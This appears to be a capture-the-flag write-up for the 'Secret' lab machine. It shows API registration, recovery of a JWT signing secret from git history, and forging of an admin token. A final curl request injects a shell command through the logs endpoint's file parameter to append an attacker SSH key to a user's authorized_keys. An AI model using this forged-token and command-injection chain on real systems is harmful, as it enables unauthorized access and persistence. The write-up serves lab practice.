when we go to `secret.htb/docs` it shows us how to register a user and login

Example request:
```
POST /api/user/register HTTP/1.1
Host: secret.htb:3000
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-GPC: 1
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
If-None-Match: W/"5d-ArPF0JBxjtRzy3wpSVF4hSVtK4s"
Connection: close
Content-Length: 79
Content-Type: application/json

{
"name": "adminn",
	"email": "asdf@adsf.com",
	"password": "password"
 }
```

Be sure to include `content-type`

Our JWT token

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjBjODljM2Q4ZGI1NTA0NGRlZjY0MmYiLCJuYW1lIjoiYWRtaW5uIiwiZW1haWwiOiJhc2RmQGFkc2YuY29tIiwiaWF0IjoxNjQ0OTg4ODk5fQ.5xy6ixmtqXI35ix20TV4x8enAzO7VPM0XFu4ku7QYc4
```



Looked at git commit history

`git diff de0a46b5107a2f4d26e348303e76d85ae4870934 `

We find an old secret:

`gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE`


We craft a JWT token with the exact payload dasith used in his docs and sign it with the secret we found (do not check base64 encode)

New auth token:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTE0NjU0ZDc3ZjlhNTRlMDBmMDU3NzciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjI4NzI3NjY5fQ.52W5mGLsIO2iiLpy3f1VkVavP4hOoWHxy5_0BDn9UKo
```



```
curl -XGET 'http://secret.htb:3000/api/logs?file=/home;echo+%22ssh-rsa+AAAAB3NzaC1yc2EAAAADAQABAAABgQCmupLnCHYTjXVR%2Ff0oFfJ4v%2BA1%2BqWtZWQxHIP4yZ7HaPsdMLW%2Bobj7fRCtKHVYaEQVlOiOEbim2BAWcBCOq774MeZ0tTr37e%2FBEXFG7CB8gmFYPpoo1DXkPQwugDqoV6F872V86TnD6wHp3UpTuZxeTwBE80HsvN%2FA7CTSX80MllrEHqyzZ4SgoBMAMr90nXftI8G9UhTK51%2FA05Rhe%2BY7mzwQbXAIz9ObqlxVlY%2BmO7mR4sEI5UtDvN%2BU158NGasyttH5Zf9HXpmfOOPOHOaHA0omDhfmmqp1%2BFmfYPbAJo9%2BVivCs0%2B2Ir0EPrUaOOTCz8ucz740UsiIkKBboJvKIaIGRozaRsIpUD4o3MWqK3iwLNTtF7kknz4TFGpA2E6YnnTX6amtx5ed7mCTGy6KIliTheI9kSYY5T8sYoCc9NyacTm0D6bLzWAg4C0fG1q8d6ir%2FH0tB0Cr5DCShao49WWiGQGvcOp7GuxOFdnl6xtlu87N2XPOQw6PAtqxIwk%3D+keez%40kali%22+%3E%3E+%2Fhome%2Fdasith%2F.ssh%2Fauthorized_keys%3B+chmod+0600+%2Fhome%2Fdasith%2Fauthorized_keys' -H "auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTE0NjU0ZDc3ZjlhNTRlMDBmMDU3NzciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjI4NzI3NjY5fQ.52W5mGLsIO2iiLpy3f1VkVavP4hOoWHxy5_0BDn9UKo"
```
